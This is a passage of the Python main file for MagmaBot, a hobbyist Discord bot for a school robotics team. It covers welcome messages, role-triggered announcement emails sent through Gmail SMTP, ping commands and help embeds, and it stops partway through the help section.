'''
Copyright (c) 2022 Kiet Pham <kiet.riley2005@gmail.com>
This software/program has a copyright license, more information is in the 'LICENSE' file
IF YOU WANT TO USE/COPY/MODIFY/REPRODUCE/RE-DISTRIBUTE THIS PROGRAM, YOU MUST INCLUDE A COPY OF THE LICENSE

Author Name: Kiet Pham, Junle Yan
Author Contact: kiet.riley2005@gmail.com
Discord: CaptainVietnam6#9842
Discord Server: https://discord.gg/3z76p8H5yj
GitHub: https://github.com/CaptainVietnam6
Instagram: @itzkiettttt_fpv
Program Status: ACTIVE - IN DEVELOPMENT
'''
'''
just an important note; this bot is comepletely based of CV6 due to time constraits. some code and sections have been modified.
'''

#File      Path: /home/runner/MagmaBot/main.py
#Directory Path: /home/runner/MagmaBot


#imports related to discord or discord packages
import discord
from discord.ext import commands
from discord.utils import get
from discord.ext.commands import cooldown
from discord.ext.commands import BucketType
from discord import FFmpegPCMAudio


#other important imports for system
import os
from os import system
import random
from random import randint
import time
import youtube_dl
import shutil
import asyncio
import PyDictionary
from PyDictionary import PyDictionary
import smtplib
import ssl
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import numpy
import pathlib
from pathlib import Path
import socket as sct


#imports from other files
from keep_alive import keep_alive
BOT_TOKEN = os.environ["BOT_TOKEN_HIDDEN"]
bot_email_password = os.environ['bot_email_password']
discord_invite_link = os.environ['discord_inv_link']


'''REFER TO NOTES TO UNDERSTAND CODE BETTER AND USE IT AS A INDEX TO SEE WHERE CERTAIN COMMAND CLASSES ARE'''


'''START OF IMPORTANT STUFF, DEALS WITH BOT AND INTERNAL COMMANDS'''


#INTENTS
intents = discord.Intents().all()


#PREFIX THE BOT USES
bot_prefixes = ["mag ", "magma ", "mag", "magma", "/", "m! ", "m!"]
client = commands.Bot(case_insensitive = False, command_prefix = bot_prefixes, intents = intents)
client.owner_ids = [597621743070216203, 467451098735837186]


#REMOVES DEFAULT HELP COMMAND
@client.remove_command("help")


#LOAD cog
@client.command()
async def load(ctx, extension):
    client.load_extension(f"cogs.{extension}")


#UNLOAD cog
@client.command()
async def unload(ctx, extension):
    client.unload_extension(f"cogs.{extension}")


#RELOAD COG
@client.command()
async def reload(ctx, extension):
    client.reload_extension(f"cogs.{extension}")


#CONNECTS COGS FILE 
for filename in os.listdir("./cogs"):
    if filename.endswith(".py"):
        client.load_extension(f"cogs.{filename[:-3]}")


#LOADS JISHAKU LIBRARY
#client.load_extension('jishaku')


#ALERTS WHEN MagmaBot IS READY AND JOINS VC ON READY
@client.event
async def on_ready():
    await client.change_presence(status = discord.Status.online, activity = discord.Game("Programmed by Kiet P. in Python 3.8.2"))
    await asyncio.sleep(float(1.5))
    print("MagmaBot is ready and online")

    #notifs for CV6's Playground server
    channel = client.get_channel(816179144961818634)
    await channel.send("MagmaBot is online and ready")
    #notifs for Magma Robotics Server
    channel = client.get_channel(873124359353548840)
    await channel.send("MagmaBot is online and ready")

    #joins vc on ready
    channel = client.get_channel(873093416710463511)
    await channel.connect()


#RETURNS BOT'S PING IN MILLISECONDS
@client.command()
async def ping(ctx):
    await ctx.reply(f"Pong! {client.latency * 1000}ms")
    print(f"ping: {client.latency * 1000}ms")


#SERVER COLOR HEX CODE REMINDER THINGY
@client.command(aliases = ["serhexcode"])
async def _serverhexcode(ctx):
    await ctx.reply("the server theme hex code is **#ff0000** (this is the official team color)")


#defines bot color for use in embeds
bot_color = 0xff0000


'''END OF IMPORTANT STUFF, DEALS WITH BOT AND INTERNAL COMMANDS'''

'''START OF MODERATION COMMANDS'''


#chat purge command cleared out as suspicion of passing rate limit and causing issues
'''
#CHAT PURGE COMMAND
@client.command(aliases = ["clear", "Clear", "Purge", "purge"])
@commands.has_any_role("Admin", "Co-admin", "Moderator", "Staff", "staff-in-training")
@cooldown(1, 180, BucketType.default)
async def _chat_clear(ctx, amount = 100):
    await ctx.channel.purge(limit = amount + 1)
    await asyncio.sleep(float(1.5))
    await ctx.send (f"cleared {amount} messages from chat")
    await asyncio.sleep(float(0.5))
    await ctx.send("Please wait 3 minutes before using this command again :)")
'''


#MEMBER JOIN WELCOME
@client.event
async def on_member_join(member):
    channel = client.get_channel(873093415976464417)
    channel2 = client.get_channel(873124359353548840)
    mention = member.mention

    #welcomes people in #welcome
    await channel.send(f"{mention} Welcome to the official Team Magma 3008 Robotics discord server! Please look in <#873093415976464418> for our rules and please change your server nickname to your real name.")
    welcome_gifs = [
        "https://media.giphy.com/media/xUPGGDNsLvqsBOhuU0/giphy.gif",
        "https://media.giphy.com/media/3o6ZtpxSZbQRRnwCKQ/giphy.gif",
        "https://media.giphy.com/media/H1TKAv5I5AOYcD7vxq/giphy.gif",
        "https://media.giphy.com/media/bcKmIWkUMCjVm/giphy.gif",
        "https://tenor.com/view/welcome-waving-hi-hello-baby-yoda-gif-16022297",
        "https://tenor.com/view/hello-hi-duck-cute-kawaii-gif-11820295",
        "https://tenor.com/view/penguin-hello-hi-hey-there-cutie-gif-3950966"
    ]
    await channel.send(random.choice(welcome_gifs))
    
    #alerts captain in #bot-status that someone joined
    await channel2.send(f"<@467451098735837186> <@392066726281609228>, someone has joined the server")


#SENDS NOTIFICATION EMAIL
@client.listen("on_message")
async def _notif_email_system(message):

    # GETS DATABASE DATA
    def load_json(path):
        with open(path, 'r') as f:
            dictionary = json.load(f)
        return dictionary
    email_dict = load_json("database/contacts.json")
    receiver_email = email_dict["emails"]
    author_name = message.author.display_name
    if message.author.bot:
        return
    else:
        if "<@&874082096858136606>" in message.content:
            sender_email = "magma3008bot@gmail.com" #Sending email
            password = bot_email_password

            email_num_sent = 1
            for i in range(len(receiver_email)):
                active_email = receiver_email[i]
                send_message = MIMEMultipart("alternative")
                send_message["Subject"] = "Magma 3008 Robotics - Email Notification"
                send_message["From"] = sender_email
                send_message["To"] = active_email

                #plain-text to be sent
                text = f"""\
Announcement from Discord by {author_name}:
"{message.content.replace('<@&874082096858136606> ', '')}"





This is an automated email message sent by a bot, the original message can be viewed on the Official Team Magma 3008 Discord Server. If you feel like you received this email by accident, please reply CANCEL NOTIFS.


Link to Discord Server: {discord_invite_link}
MagmaBot GitHub Repository: https://github.com/CaptainVietnam6/MagmaBot
Magma Robotics Website: https://www.magmarobotics.com/
Magma Robotics Instagram: @frcteam3008
Magma Robotics Facebook: @Team Falcons
Magma Robotics Twitter: @FRCTeam3008
Magma Media Email: 3008@imagineworks.com
"""
                part1 = MIMEText(text, "plain")
                send_message.attach(part1)

                #Create secure connection with server and sends email
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, active_email, send_message.as_string())

                #Alerts that the email has been sent in the Terminal
                print(f"sent email #{email_num_sent}")
                email_num_sent += 1
            await message.channel.send("Emails have been sent out.")
            await message.channel.send("<@&873093415959683087> in case you missed it ^")


#SENDS FRC NOTIFICATION EMAIL
@client.listen("on_message")
async def _frc_notif_email_system(message):

    # GETS DATABASE DATA
    def load_json(path):
        with open(path, 'r') as f:
            dictionary = json.load(f)
        return dictionary
    email_dict = load_json("database/frc_contacts.json")
    receiver_email = email_dict["emails"]

    author_name = message.author.display_name
    if message.author.bot:
        return
    else:
        if "<@&888582826344202280>" in message.content:
            sender_email = "magma3008bot@gmail.com" #Sending email
            password = bot_email_password

            email_num_sent = 1
            for i in range(len(receiver_email)):
                active_email = receiver_email[i]
                send_message = MIMEMultipart("alternative")
                send_message["Subject"] = "FRC Robotics - Email Announcement"
                send_message["From"] = sender_email
                send_message["To"] = active_email

                #plain-text to be sent
                text = f"""\
Announcement from Discord by {author_name}:
"{message.content.replace('<@&888582826344202280> ', '')}"





This is an automated email message sent by a bot, the original message can be viewed on the Official Team Magma 3008 Discord Server. If you feel like you received this email by accident, please reply CANCEL NOTIFS.


Link to Discord Server: {discord_invite_link}
MagmaBot GitHub Repository: https://github.com/CaptainVietnam6/MagmaBot
Magma Robotics Website: https://www.magmarobotics.com/
Magma Robotics Instagram: @frcteam3008
Magma Robotics Facebook: @Team Falcons
Magma Robotics Twitter: @FRCTeam3008
Magma Media Email: 3008@imagineworks.com
"""
                part1 = MIMEText(text, "plain")
                send_message.attach(part1)

                #Create secure connection with server and sends email
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, active_email, send_message.as_string())

                #Alerts that the email has been sent in the Terminal
                print(f"sent email #{email_num_sent}")
                email_num_sent += 1
            await message.channel.send("FRC directed emails have been sent out.")
            await message.channel.send("<@&873103516728700928> in case you missed it ^")


#SENDS FTC NOTIFICATION EMAIL
@client.listen("on_message")
async def _ftc_notif_email_system(message):

    # GETS DATABASE DATA
    def load_json(path):
        with open(path, 'r') as f:
            dictionary = json.load(f)
        return dictionary
    email_dict = load_json("database/ftc_contacts.json")
    receiver_email = email_dict["emails"]

    author_name = message.author.display_name
    if message.author.bot:
        return
    else:
        if "<@&888582728243609630>" in message.content:
            sender_email = "magma3008bot@gmail.com" #Sending email
            password = bot_email_password

            email_num_sent = 1
            for i in range(len(receiver_email)):
                active_email = receiver_email[i]
                send_message = MIMEMultipart("alternative")
                send_message["Subject"] = "FTC Robotics - Email Announcement"
                send_message["From"] = sender_email
                send_message["To"] = active_email

                #plain-text to be sent
                text = f"""\
Announcement from Discord by {author_name}:
"{message.content.replace('<@&888582728243609630> ', '')}"





This is an automated email message sent by a bot, the original message can be viewed on the Official Team Magma 3008 Discord Server. If you feel like you received this email by accident, please reply CANCEL NOTIFS.


Link to Discord Server: {discord_invite_link}
MagmaBot GitHub Repository: https://github.com/CaptainVietnam6/MagmaBot
Magma Robotics Website: https://www.magmarobotics.com/
Magma Robotics Instagram: @frcteam3008
Magma Robotics Facebook: @Team Falcons
Magma Robotics Twitter: @FRCTeam3008
Magma Media Email: 3008@imagineworks.com
"""
                part1 = MIMEText(text, "plain")
                send_message.attach(part1)

                #Create secure connection with server and sends email
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, active_email, send_message.as_string())

                #Alerts that the email has been sent in the Terminal
                print(f"sent email #{email_num_sent}")
                email_num_sent += 1
            await message.channel.send("FTC directed emails have been sent out.")
            await message.channel.send("<@&873103168769241088> in case you missed it ^")


#SENDS VEX NOTIFICATION EMAIL
@client.listen("on_message")
async def _vex_notif_email_system(message):

    # GETS DATABASE DATA
    def load_json(path):
        with open(path, 'r') as f:
            dictionary = json.load(f)
        return dictionary
    email_dict = load_json("database/vex_contacts.json")
    receiver_email = email_dict["emails"]

    author_name = message.author.display_name
    if message.author.bot:
        return
    else:
        if "<@&888582938424385546>" in message.content:
            sender_email = "magma3008bot@gmail.com" #Sending email
            password = bot_email_password

            email_num_sent = 1
            for i in range(len(receiver_email)):
                active_email = receiver_email[i]
                send_message = MIMEMultipart("alternative")
                send_message["Subject"] = "VEX Robotics - Email Announcement"
                send_message["From"] = sender_email
                send_message["To"] = active_email

                #plain-text to be sent
                text = f"""\
Announcement from Discord by {author_name}:
"{message.content.replace('<@&888582938424385546> ', '')}"





This is an automated email message sent by a bot, the original message can be viewed on the Official Team Magma 3008 Discord Server. If you feel like you received this email by accident, please reply CANCEL NOTIFS.


Link to Discord Server: {discord_invite_link}
MagmaBot GitHub Repository: https://github.com/CaptainVietnam6/MagmaBot
Magma Robotics Website: https://www.magmarobotics.com/
Magma Robotics Instagram: @frcteam3008
Magma Robotics Facebook: @Team Falcons
Magma Robotics Twitter: @FRCTeam3008
Magma Media Email: 3008@imagineworks.com
"""
                part1 = MIMEText(text, "plain")
                send_message.attach(part1)

                #Create secure connection with server and sends email
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, active_email, send_message.as_string())

                #Alerts that the email has been sent in the Terminal
                print(f"sent email #{email_num_sent}")
                email_num_sent += 1
            await message.channel.send("VEX directed emails have been sent out.")
            await message.channel.send("<@&873103193746337854> in case you missed it ^")


#SENDS DRONES NOTIFICATION EMAIL
@client.listen("on_message")
async def _drones_notif_email_system(message):

    # GETS DATABASE DATA
    def load_json(path):
        with open(path, 'r') as f:
            dictionary = json.load(f)
        return dictionary
    email_dict = load_json("database/drones_contacts.json")
    receiver_email = email_dict["emails"]

    author_name = message.author.display_name
    if message.author.bot:
        return
    else:
        if "<@&888582993038430219>" in message.content:
            sender_email = "magma3008bot@gmail.com" #Sending email
            password = bot_email_password

            email_num_sent = 1
            for i in range(len(receiver_email)):
                active_email = receiver_email[i]
                send_message = MIMEMultipart("alternative")
                send_message["Subject"] = "Drones Robotics - Email Announcement"
                send_message["From"] = sender_email
                send_message["To"] = active_email

                #plain-text to be sent
                text = f"""\
Announcement from Discord by {author_name}:
"{message.content.replace('<@&888582993038430219> ', '')}"





This is an automated email message sent by a bot, the original message can be viewed on the Official Team Magma 3008 Discord Server. If you feel like you received this email by accident, please reply CANCEL NOTIFS.


Link to Discord Server: {discord_invite_link}
MagmaBot GitHub Repository: https://github.com/CaptainVietnam6/MagmaBot
Magma Robotics Website: https://www.magmarobotics.com/
Magma Robotics Instagram: @frcteam3008
Magma Robotics Facebook: @Team Falcons
Magma Robotics Twitter: @FRCTeam3008
Magma Media Email: 3008@imagineworks.com
"""
                part1 = MIMEText(text, "plain")
                send_message.attach(part1)

                #Create secure connection with server and sends email
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(sender_email, password)
                    server.sendmail(sender_email, active_email, send_message.as_string())

                #Alerts that the email has been sent in the Terminal
                print(f"sent email #{email_num_sent}")
                email_num_sent += 1
            await message.channel.send("Drones directed emails have been sent out.")
            await message.channel.send("<@&873103245210443776> in case you missed it ^")


#EVERYONE PING + MESSAGE COMMAND
@client.command(aliases = ["eping"])
@cooldown(1, 3600, BucketType.default)
@commands.has_any_role("Rare Earth Metal", "Mentors", "Team Captain", "FTC Captain", "VEX Captain", "Drones Captain")
async def _mass_announcement(ctx, *, message):
    channel = client.get_channel(873124359353548840)
    await ctx.channel.purge(limit = 1)
    await asyncio.sleep(float(0.25))
    await ctx.send(f"@everyone {message}")
    await channel.send(f"Sent the message:\n\n```{message}```")


#HERE PING + MESSAGE COMMAND
@client.command(aliases = ["hping"])
@cooldown(1, 3600, BucketType.default)
@commands.has_any_role("Rare Earth Metal", "Mentors", "Team Captain", "FTC Captain", "VEX Captain", "Drones Captain")
async def _here_announcement(ctx, *, message):
    channel = client.get_channel(873124359353548840)
    await ctx.channel.purge(limit = 1)
    await asyncio.sleep(float(0.25))
    await ctx.send(f"@here {message}")
    await channel.send(f"Sent the message:\n\n```{message}```")


#FRC PING + MESSAGE
@client.command(aliases = ["frcping", "FRCping"])
@cooldown(1, 3600, BucketType.default)
@commands.has_any_role("Rare Earth Metal", "Mentors", "Team Captain", "FTC Captain", "VEX Captain", "Drones Captain")
async def _frc_announcement(ctx, *, message):
    channel = client.get_channel(873124359353548840)
    await ctx.channel.purge(limit = 1)
    await asyncio.sleep(float(0.25))
    await ctx.send(f"<@&873103516728700928> {message}")
    await channel.send(f"Sent the message:\n\n```{message}```")


#FTC PING + MESSAGE
@client.command(aliases = ["ftcping", "FTCping"])
@cooldown(1, 3600, BucketType.default)
@commands.has_any_role("Rare Earth Metal", "Mentors", "Team Captain", "FTC Captain", "VEX Captain", "Drones Captain")
async def _ftc_announcement(ctx, *, message):
    channel = client.get_channel(873124359353548840)
    await ctx.channel.purge(limit = 1)
    await asyncio.sleep(float(0.25))
    await ctx.send(f"<@&873103168769241088> {message}")
    await channel.send(f"Sent the message:\n\n```{message}```")


#VEX PING + MESSAGE
@client.command(aliases = ["vexping", "VEXping"])
@cooldown(1, 3600, BucketType.default)
@commands.has_any_role("Rare Earth Metal", "Mentors", "Team Captain", "FTC Captain", "VEX Captain", "Drones Captain")
async def _vex_announcement(ctx, *, message):
    channel = client.get_channel(873124359353548840)
    await ctx.channel.purge(limit = 1)
    await asyncio.sleep(float(0.25))
    await ctx.send(f"<@&873103193746337854> {message}")
    await channel.send(f"Sent the message:\n\n```{message}```")


#DRONES PING + MESSAGE
@client.command(aliases = ["dronesping", "droneping"])
@cooldown(1, 3600, BucketType.default)
@commands.has_any_role("Rare Earth Metal", "Mentors", "Team Captain", "FTC Captain", "VEX Captain", "Drones Captain")
async def _drones_announcement(ctx, *, message):
    channel = client.get_channel(873124359353548840)
    await ctx.channel.purge(limit = 1)
    await asyncio.sleep(float(0.25))
    await ctx.send(f"<@&873103245210443776> {message}")
    await channel.send(f"Sent the message:\n\n```{message}```")


#SEND BOT INVITE LINK COMMAND
@client.command(aliases = ["botinvite", "BotInvite", "Botinvite", "MBlink", "mblink"])
@cooldown(1, 60, BucketType.default)
async def _sendbotinvite(ctx):
    print("Someone requested bot invite link\n")
    await ctx.send("Sending bot's invite link!")
    await asyncio.sleep(float(0.5))
    await ctx.reply("https://discord.com/api/oauth2/authorize?client_id=873118823237160991&permissions=0&scope=bot")


#SEND BOT GITHUB REPO
@client.command(aliases = ["github", "githubrepo", "GitHub", "Github", "botgithub"])
@cooldown(1, 15, BucketType.default)
async def _sendbotgithub(ctx):
    print("someone requested the bot's github repo")
    await ctx.send("Sending the bot's GitHub repository!")
    await asyncio.sleep(float(0.5))
    await ctx.reply("https://github.com/CaptainVietnam6/MagmaBot")


#SEND BOT'S MAIN.PY CODE FILE
@client.command(aliases = ["sendcode", "Sendcode", "SendCode"])
async def _sendbotcode(ctx):
    await ctx.reply(file = discord.File(r"/home/runner/MagmaBot/main.py"))


#MEMBER ID GET
@client.command(aliases = ["id", "ID", "Id"])
async def _get_member_id(ctx):
    author_name = ctx.author.display_name
    user_id = ctx.author.id
    embed = discord.Embed(
        title = "Requested User ID",
        description = f"{user_id}",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.reply(embed = embed)

 
#EMERGENCY BOT STOP COMMAND
@client.command(aliases = ["exit", "forceexit"])
@commands.has_any_role("FTC Captain")
async def _force_exit(ctx):
    author_name = ctx.author.display_name
    print(f"Emergency Stop/Exit command triggered by {author_name}")
    await ctx.send(f"**Emergency Stop/Exit command triggered by {author_name}**")
    #await asyncio.sleep(float(0.5))
    #await client.change_presence(status = discord.Status.idle)
    await asyncio.sleep(float(0.5))
    exit()


#VOTEKICK COMMAND
@client.command(aliases = ["votekick", "Votekick"])
async def _votekick(ctx, user_tag, *, kick_reason = "None provided"):
    thumbs_down = "👎"
    thumbs_up = "👍"
    embed = discord.Embed(
        title = "Votekick Member",
        description = f"Votekick for member {user_tag}\nReason: {kick_reason}",
        color = bot_color
    )
    embed_message = await ctx.send(embed = embed)
    await embed_message.add_reaction(thumbs_up)
    await embed_message.add_reaction(thumbs_down)


#RULES COMMAND
@client.command(aliases = ["rules", "Rules"])
@cooldown(1, 30, BucketType.default)
async def _therules(ctx):
    heart_emoji = "\u2764\ufe0f"
    embed = discord.Embed(
        title = "「Server rules」",
        description = "1. Set your server nickname as your real first name\n2. No excessive swearing or profanity\n3. Keep anything not related to robotics in Off Topic channels, related to robotics? In other channels in their respective categories\n4. Be mindful and considerate of others\n5. Don't abuse the bot or spam",
        color = bot_color
    )
    embed.set_footer(text = f"Bot and rules made with love by Kiet P.{heart_emoji}")
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/834594619894267945/873129226436489256/20210805_205424.jpg")
    await ctx.send(embed = embed)


#FORMS COMMANDS
@client.command(aliases = ["form", "forms", "Forms", "Form"])
async def _forms_links(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(title = "Robotics Form Links", description = "", color = bot_color)
    embed.add_field(name = 'Robotics info & contact form:', value = 'https://forms.gle/3r47ypeub39Jf41o7', inline = False)
    embed.add_field(name = '~~Robotics Open House Confirmation~~:', value = 'https://forms.gle/iMHyTGSJpB1jcyP68', inline = False)
    embed.add_field(name = 'Robotics Sub-Teams Pick:', value = 'https://forms.gle/6HDE4tzidquohE9L7', inline = False)
    embed.add_field(name = 'Emergency Contact Form:', value = 'https://forms.gle/uiMqrhBZq5uB5LAU6', inline = False)
    embed.add_field(name = 'Commitment, Fees and t-shirt Form:', value = 'https://docs.google.com/document/d/1nFxeGExznJ07M5myA-FOk49_UiPKWONm2vL6KNoCkuI/edit?usp=drivesdk\n', inline = False)
    embed.add_field(name = 'Teams Rosters:', value = 'https://docs.google.com/spreadsheets/d/1KbJfU6uz4s8GdatZNlW7-kSMLweJ-eJqOSC6Lh7ABYM/edit?usp=sharing', inline = False)

    embed.set_footer(text = f"Requested by {author_name}")
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/834594619894267945/873129226436489256/20210805_205424.jpg")
    await ctx.send(embed = embed)


#HELP COMMAND
@client.group(invoke_without_command = True, aliases = ["help", "Help"])
async def _help(ctx):
    #sends the help directory in server channel
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Help command categories**",
        description = "**These are the commands you can run to see the list of commands in each category.**\n\nFun commands: **mag help fun**\nMusic commands: **mag help music**\nSoundboard commands: **mag help sb**\nGame commands: **mag help game**\nEmoji commands: **mag help emoji**\nModeration commands: **mag help mod**\n",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}, you should also recieve a DM with all the command lists")
    await ctx.send(embed = embed)
    
    #sends all help command lists in person's DMs
    async def help_fun_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "**Fun/responses related commands list**",
            description = "**These are commands that relate to fun or responses features of MagmaBot**\n\n8ball command: **mag 8ball {question}**\nDice command: **mag dice**\nMeme command: **mag meme**\nHow-to-use-google: **mag google**\nBenice to staff: **mag benice**\nDictionary: **mag dictionary {word}**\nSynonyms: **mag synonym {word}**\nAntonyms: **mag antonym {word}**\nRepeat after user: **mag repeat**\nCapt Twitch link: **mag twitch**\nEw lightmode: **mag lightmode**\nReply spam: **mag spam {word}**\nPrint fancy text: **mag print {word}**\nSpeedrun profile: **mag speedrun {user name}**\nShut up GIF: **mag shut**\nSends nothing: **mag nothing**\nDiscordmod meme: **mag discordmod**\nFair: **fair**\nPog: **pog**\nCalculate Pi: **mag pi {enter digits}**\nDM user: **mag dm {tag person} {message}**\nRandomly pings someone: **mag someone**\nI like trains: **mag trains**\nSomeone say math?: **math**\nEncrypt Message: **mag encrypt {message}**\nDecrypt Message: **mag decrypt {message}**",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        await ctx.author.send(embed = embed)

    async def help_music_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "**Music related commands list**",
            description = "**These are commands that relate to music features of MagmaBot**\n\nJoin VC: **mag join**\nLeave VC: **mag leave**\nPlay song: **mag play (youtube url)**\nQueue song: **mag queue (youtube url)**\nPause music: **mag pause**\nResume music: **mag resume**\nStop music: **mag stop**\n",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        await ctx.author.send(embed = embed)

    async def help_sb_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "**Soundboard related commands list**",
            description = "**These are commands that relate to voice channel soundboard features of MagmaBot**\n\nJoin VC: **mag join**\nLeave VC: **mag leave**\nAirhorn: **mag sb airhorn**\nAli-a intro: **mag sb alia**\nBegone thot: **mag sb begonethot**\nDamn son where'd you find this: **mag sb damnson**\nDankstorm: **mag sb dankstorm**\nDeez nuts: **mag sb deeznuts**\nDeja Vu: **mag sb dejavu**\nLook at this dude: **mag sb dis_dude**\nAnother guy left the chat: **mag sb fleft**\nFart: **mag sb fart**\nHah gaaayyy: **mag sb hahgay**\nIt's called hentai and it's art: **mag sb henart**\nIlluminati song: **mag sb illuminati**\nBitch Lasagna: **mag sb lasagna**\nLoser: **mag sb loser**\nNoob: **mag sb noob**\nOof sound: **mag sb oof**\nPickle Rick: **mag sb picklerick**\nNice: **mag sb nice**\nWhy don't we just relax and turn on the radio: **mag sb radio**\nRick roll: **mag sb rickroll**\nThis is sparta: **mag sb sparta**\nTitanic flute fail: **mag sb titanic**\nGTA V Wasted: **mag sb wasted**\nWide Putin: **mag wideputin**\nWubba lubba dub dub: **mag sb wubba**\n",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        await ctx.author.send(embed = embed)

    async def help_game_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "**Game related commands list**",
            description = "**These are commands that relate to game features of MagmaBot**\n\n8ball command: **mag 8ball (your question)**\nDice command, returns 1-6: **mag dice**\nRock Paper Scissors: **mag rps (rock, paper, or scissors)**\nMeme command: **mag meme**\n",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        await ctx.author.send(embed = embed)

    async def help_emoji_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "**Emoji related commadns list**",
            description = "**The commands with an $ have an auto detection feature to detect a certain keyword in your message**\n\nSo fake$: **mag fake**\nX to doubt$: **mag doubt**\nStonks$: **mag stonks**\nSimp pill$: **mag simp**\nWat: **mag wat**\nAdmin abooz: **mag abooz**\n60s Timer$: **mag timer**\nThats racist$: **mag racist**\nPolice$: **mag police**\nF-spam emoji: **mag fpsam**\nClap emoji: **mag clap**\nYou tried: **mag youtried**\nPython logo: **mag python**\nPepe pog: **mag pepepog**",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        await ctx.author.send(embed = embed)

    async def help_mod_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "**Moderation related commands list**",
            description = "**These are commands that relate to moderation features of MagmaBot, most require administrative powers**\n\nWelcome command: **mag welcome**\nDescription command: **mag description**\nBot description: **mag botdesc**\nRules: **mag rules**\nForms: **mag forms**\nEveryone announcement: **mag eping {message}**\nHere announcement: **mag hping {message}**\nFRC Notif: **frcping {message}**\nFTC Notif: **ftcping {message}**\nVEX Notif: **vexping {message}**\nDrones Notif: **dronesping {message}**\nUser ID: **mag id {tag user}**\nKick command: **mag kick (tag member, reason)**\nBan command: **mag ban (tag member, reason)**\nVotekick: **mag votekick (tag member) (reason)**\nPurge/clear chat: **mag clear (number of messages)**\nBot invite link: **mag botinvite**\nTime command: **mag time**\nHelp directory: **mag help**",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        await ctx.author.send(embed = embed)

    #sends each list to requester's DM
    await asyncio.sleep(float(0.25))
    await help_fun_dm() #sends fun commands list
    await asyncio.sleep(float(0.25))
    await help_music_dm() #sends music commands list
    await asyncio.sleep(float(0.25))
    await help_sb_dm() #sends soundboard command list
    await asyncio.sleep(float(0.25))
    await help_game_dm() #sends Game commands list
    await asyncio.sleep(float(0.25))
    await help_emoji_dm() #sends emoji commands list
    await asyncio.sleep(float(0.25))
    await help_mod_dm() #sends mod commands list
    await asyncio.sleep(float(0.25))
    await ctx.author.send("Above are all the command lists for MagmaBot, keep in mind this DM feature is still **in beta** and will be subject to changes and updates without further notice")
    await ctx.send("I sent you a DM with all the command lists")
    
    
#HELP - FUN COMMANDS
@_help.command(aliases = ["fun", "Fun"])
async def _help_fun(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Fun/responses related commands list**",
        description = "**These are commands that relate to fun or responses features of MagmaBot**\n\n8ball command: **mag 8ball {question}**\nDice command: **mag dice**\nMeme command: **mag meme**\nHow-to-use-google: **mag google**\nBenice to staff: **mag benice**\nDictionary: **mag dictionary {word}**\nSynonyms: **mag synonym {word}**\nAntonyms: **mag antonym {word}**\nRepeat after user: **mag repeat**\nCapt Twitch link: **mag twitch**\nEw lightmode: **mag lightmode**\nReply spam: **mag spam {word}**\nPrint fancy text: **mag print {word}**\nSpeedrun profile: **mag speedrun {user name}**\nShut up GIF: **mag shut**\nSends nothing: **mag nothing**\nDiscordmod meme: **mag discordmod**\nFair: **fair**\nPog: **pog**\nCalculate Pi: **mag pi {enter digits}**\nDM user: **mag dm {tag person} {message}**\nRandomly pings someone: **mag someone**\nI like trains: **mag trains**\nSomeone say math?: **math**\nEncrypt Message: **mag encrypt {message}**\nDecrypt Message: **mag decrypt {message}**",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)

#HELP - MUSIC COMMANDS
@_help.command(aliases = ["music", "Music"])
async def _help_music(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Music related commands list**",
        description = "**These are commands that relate to music features of MagmaBot**\n\nJoin VC: **mag join**\nLeave VC: **mag leave**\nPlay song: **mag play (youtube url)**\nQueue song: **mag queue (youtube url)**\nPause music: **mag pause**\nResume music: **mag resume**\nStop music: **mag stop**\n",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)

#HELP - SOUNDBOARD COMMANDS
@_help.command(aliases = ["sb", "Sb", "SB", "soundboard", "SoundBoard", "Soundboard"])
async def _help_soundboard(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Soundboard related commands list**",
